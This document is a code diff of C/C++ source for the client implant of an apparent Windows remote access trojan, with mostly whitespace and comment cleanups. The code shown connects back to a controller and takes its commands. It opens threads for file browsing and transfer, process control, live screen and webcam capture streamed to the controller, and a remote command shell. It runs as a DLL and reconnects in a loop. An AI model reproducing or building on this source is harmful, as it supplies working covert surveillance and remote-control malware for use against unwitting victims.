@@ -51,7 +51,7 @@ unsigned long _stdcall resolve(char *host)
 	struct hostent *ser = NULL;
 
 	long i = inet_addr(host);
-	
+
 	if (i < 0) //Not Ip
 	{
 		ser = (struct hostent*)gethostbyname(host);
@@ -60,13 +60,13 @@ unsigned long _stdcall resolve(char *host)
 		{
 			ser = (struct hostent*)gethostbyname(host); //retry
 		}
-		
+
 		if (ser != NULL)
 		{
 			return (*(unsigned long *)ser->h_addr);
 		}
-		
-		return 0;  
+
+		return 0;
 	}
 
 	return i;
@@ -78,11 +78,11 @@ SOCKET ConnectServer(int Port, char Addr[])
 	LocalAddr.sin_family = AF_INET;
 	LocalAddr.sin_port = htons(Port);
 	LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);
-	
+
 	SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
-	
+
 	int timeout = 45000;
-	int err = setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+	setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 
 	if (connect(hSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
@@ -90,10 +90,8 @@ SOCKET ConnectServer(int Port, char Addr[])
 
 		return SOCKET_ERROR;
 	}
-	else
-	{
-		TurnonKeepAlive(hSocket, 120);
-	}
+
+	TurnonKeepAlive(hSocket, 120);
 
 	return hSocket;
 }
@@ -108,7 +106,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 
 	MainSocket = ConnectServer();
-	
+
 	if (MainSocket == SOCKET_ERROR)
 	{
 		MsgErr("Can't Connect");
@@ -117,7 +115,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	}
 
 	SysInfo m_SysInfo;
-	GetSystemInfo(m_SysInfo);//获取系统信息
+	GetSystemInfo(m_SysInfo);
 	m_SysInfo.iVipID = modify_data.dwVipID;
 	m_SysInfo.bVideo = true; //CVideoCap::IsWebCam();
 	lstrcpy(m_SysInfo.cVersion, modify_data.strVersion);
@@ -127,7 +125,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	MsgHead msgHead;
 	char chBuffer[4096];
 
-	msgHead.dwCmd = SOCKET_CONNECT;//填充消息
+	msgHead.dwCmd = SOCKET_CONNECT;
 	msgHead.dwSize = sizeof(SysInfo);
 
 	memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));//填充被控端信息
@@ -141,21 +139,21 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 	while (1)	//接收命令
 	{
-		if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead))	//掉线，错误
+		if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead) )	//掉线，错误
 		{
 			MsgErr("Can't Recv");
 			shutdown(MainSocket, 0x02);
 			closesocket(MainSocket);
-			
+
 			return 1;
 		}
 
-		switch (msgHead.dwCmd)	//解析命令
+		switch (msgHead.dwCmd)
 		{
 			case CMD_FILEMANAGE:
 			{
 #ifdef LxFile
-				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);//开一个文件管理的线程
+				CreateThread(NULL, NULL, FileManageThread, NULL, NULL, NULL);
 #endif
 			}
 			break;
@@ -164,7 +162,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			{
 #ifdef LxScreem
 				DWORD dwSock = msgHead.dwExtend1;	//获取上线的socket==DWORD
-				CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);      //开一个屏幕传输的线程
+				CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);
 #endif
 			}
 			break;
@@ -172,21 +170,21 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			case CMD_PROCESSSTART:
 			{
 #ifdef LxProc
-				CreateThread(NULL, NULL, ProcessThread, NULL, NULL, NULL);    //开一个进程管理的线程
+				CreateThread(NULL, NULL, ProcessThread, NULL, NULL, NULL);
 #endif
 			}
 			break;
 
 			case CMD_SHELLSTART:
 			{
-				CreateThread(NULL, NULL, ShellThread, NULL, NULL, NULL);        //开一个远程Shell的线程
+				CreateThread(NULL, NULL, ShellThread, NULL, NULL, NULL);
 			}
 			break;
 
 			case CMD_VIDEOSTART:
 			{
 #ifdef LxVideo
-				CreateThread(NULL, NULL, VideoThread, NULL, NULL, NULL);        //开一个视频捕捉的线程
+				CreateThread(NULL, NULL, VideoThread, NULL, NULL, NULL);
 #endif
 			}
 			break;
@@ -197,7 +195,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			}
 			break;
 
-			case CMD_UNINSTALL:	//卸载
+			case CMD_UNINSTALL:
 			{
 				shutdown(MainSocket, 0x02);
 				closesocket(MainSocket);
@@ -353,8 +351,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	return 2;
 }
 
-//////////////////////////////////////////////////////////////////////////////////
-//文件管理线程
 DWORD _stdcall FileManageThread(LPVOID lParam)
 {
 	SOCKET FileSocket = ConnectServer();
@@ -422,7 +418,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 			{
 				FileOpt m_FileOpt;
 				memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));
-				
+
 				if (CreateThread(NULL, NULL, FileDownThread, (LPVOID)&m_FileOpt, NULL, NULL) != NULL)
 					msgHead.dwCmd  = CMD_SUCCEED;
 				else
@@ -434,7 +430,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 			{
 				FileOpt m_FileOpt;
 				memcpy(&m_FileOpt,chBuffer,sizeof(m_FileOpt));
-				
+
 				if (CreateThread(NULL,NULL,FileUpThread,(LPVOID)&m_FileOpt,NULL,NULL) != NULL)
 					msgHead.dwCmd  = CMD_SUCCEED;
 				else
@@ -464,22 +460,22 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 }
 
 DWORD _stdcall ScreenThread(LPVOID lParam)
-{	
+{
 	DWORD dwSock = (DWORD)lParam;
 
 	SOCKET ScreenSocket = ConnectServer();
-	
+
 	if (ScreenSocket == SOCKET_ERROR)
 	{
 		return 0;
 	}
-	
+
 	//设置发送缓冲区,有利于屏幕传输
 	int rcvbuf = 65536; //64KB
 	int rcvbufsize = sizeof(int);
 	setsockopt(ScreenSocket, SOL_SOCKET,SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
 	int bNodelay = 1;
-	setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
+	setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法
 
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 
@@ -525,17 +521,17 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	///////////////////////first///////////////////////////
 	dwLastSend = GetTickCount();
-	
+
 	lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
 	m_ScreenXor.CaputreFrameFirst(0);                                        //抓取当前帧
 	Sleep(15);
 	::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
-	
+
 	msgHead.dwCmd     = dwFrameID++;              //当前帧号
 	msgHead.dwSize    = lenthCompress;            //传输的数据长度
 	msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
 	msgHead.dwExtend2 = lenthCompress;            //压缩后长度
-	
+
 	bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
 
 	while (bNotStop)
@@ -552,7 +548,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 		msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
 		msgHead.dwExtend2 = lenthCompress;            //压缩后长度
 
-		bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead); //发送数据
+		bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
 
 		if ((GetTickCount() - dwLastSend) < 160)
 			Sleep(150);
@@ -581,7 +577,7 @@ DWORD _stdcall VideoThread(LPVOID lParam)
 		int rcvbufsize = sizeof(int);
 		setsockopt(VideoSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
 		int bNodelay = 1;
-		setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
+		setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法
 	}
 
 	//==================================================================
@@ -662,8 +658,6 @@ DWORD _stdcall VideoThread(LPVOID lParam)
 }
 #endif
 
-/////////////////////////////////////////////////////////////////////////////////
-//进程管理线程
 DWORD _stdcall ProcessThread(LPVOID lParam)
 {
 	SOCKET ProcessSocket = ConnectServer();
@@ -718,8 +712,7 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 	closesocket(ProcessSocket);
 	return 0;
 }
-//////////////////////////////////////////////////////////////////////////////////
-//远程shell线程
+
 DWORD _stdcall ShellThread(LPVOID lParam)
 {
 	SOCKET ShellSocket = ConnectServer();
@@ -729,24 +722,23 @@ DWORD _stdcall ShellThread(LPVOID lParam)
 	}
 
 	MsgHead msgHead;
-	char *chBuffer = new char[512 * 1024]; //数据交换区 512KB
+	char *chBuffer = new char[512 * 1024];
 
-	//send socket type
 	msgHead.dwCmd = SOCKET_CMDSHELL;
 	msgHead.dwSize = 0;
 	if (!SendMsg(ShellSocket, chBuffer, &msgHead))
 	{
-		shutdown(ShellSocket,0x02);
+		shutdown(ShellSocket, 0x02);
 		closesocket(ShellSocket);
-		return 0;//send socket type error
+		return 0; //send socket type error
 	}
 
-	while (1)	//接收命令
-	{        
+	while (1)
+	{
 		if (!RecvMsg(ShellSocket, chBuffer, &msgHead))
 			break;
 
-		switch (msgHead.dwCmd)	//解析命令
+		switch (msgHead.dwCmd)
 		{
 		case CMD_SHELLRUN:
 			{
@@ -756,21 +748,19 @@ DWORD _stdcall ShellThread(LPVOID lParam)
 		default:
 			break;
 		}
-				
-		if (!SendMsg(ShellSocket, chBuffer, &msgHead))	//发送数据
+
+		if (!SendMsg(ShellSocket, chBuffer, &msgHead))
 			break;
 	}
 
 	if (chBuffer != NULL)
 		delete[] chBuffer;
-	
+
 	shutdown(ShellSocket,0);
 	closesocket(ShellSocket);
 	return 0;
 }
 
-//////////////////////////////////////////////////////////////////////////////////
-//文件上传下载
 DWORD _stdcall FileDownThread(LPVOID lParam)
 {
 	FileOpt m_FileOpt;
@@ -849,7 +839,7 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
 	}
 	if (hInst)
 		FreeLibrary(hInst);
-		
+
 	CloseHandle(hDownFile);
 	shutdown(FileSocket, 0x02);
 	closesocket(FileSocket);
@@ -933,7 +923,7 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 DWORD WINAPI RoutineMain(LPVOID lp)
 {
 	//TCHAR MyPath[MAX_PATH*2];
-	//GetModuleFileName(hModule, MyPath, sizeof(MyPath));	
+	//GetModuleFileName(hModule, MyPath, sizeof(MyPath));
 	//CreateFile(MyPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if(lp != NULL)
@@ -945,7 +935,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		modify_data.ServerPort = 80;
 		lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
 	}
-	
+
 	int state = 1;
 
 	while (1)
@@ -959,7 +949,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 		if (state == 0) //Connect Error
 		{
 			Sleep(30 * 1000);
-		} 
+		}
 		else if (state == 1) //Network Error
 		{
 			Sleep(10 * 1000);
@@ -971,7 +961,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 
 		Sleep(1000);
 	}
-	
+
 	return 0;
 }
 
@@ -1024,10 +1014,10 @@ OK:
 #endif
 
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
-	
+
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
-	
+
 	SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));
 
 	RoutineMain(0);
@@ -1048,9 +1038,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 	}
 	else if(ul_reason_for_call == DLL_PROCESS_DETACH)
 	{
-		
-	}	
-	
+
+	}
+
 	return true;
 }
 
